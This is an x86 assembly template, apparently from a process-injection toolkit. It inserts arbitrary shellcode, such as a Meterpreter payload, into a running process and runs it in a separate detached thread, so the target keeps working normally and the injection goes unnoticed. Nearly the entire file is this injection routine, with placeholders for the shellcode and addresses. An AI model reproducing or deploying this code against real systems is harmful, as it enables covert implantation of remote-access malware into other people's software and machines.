# This code will launch the specified binary shellcode (e.g. Meterpreter)
# in a new, separate thread, then return to the original code
# so that the target process continues executing normally after injection
# However, it requires the offset for pthread_create in libpthread to do this
#
# WARNING: the binary shellcode can still cause the entire target process
# to exit. For example, with the default build options, Meterpreter will 
# happily execute in a separate thread, but if you execute the "exit" 
# command from the Meterpreter shell, it will kill the entire target process

[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]

// Spaghetti code, sorry

jmp execute_precompiled_threaded_main

execute_precompiled_threaded_launch_thread:
	push edi
	call asminject_libpthread_pthread_create
	pop edi
	call asminject_libpthread_pthread_detach

[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]:
	jmp cleanup_and_return

execute_precompiled_threaded_main:

	mov esi, 0
	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	add edi, 0x1000		# don't overwrite anything important
	mov ecx, 0
	// store the address of the shellcode in edx
	call execute_precompiled_threaded_get_next
	execute_precompiled_threaded_get_next:
	pop edx
	add edx, 6
	jmp execute_precompiled_threaded_launch_thread

// Removed delimiter as workaround

[VARIABLE:INLINE_SHELLCODE:VARIABLE]

	# since this is threaded execution, exit the thread instead of returning
	mov edi, 0
	call asminject_libpthread_pthread_exit

	jump_back_from_shellcode:

	jmp [VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]

	


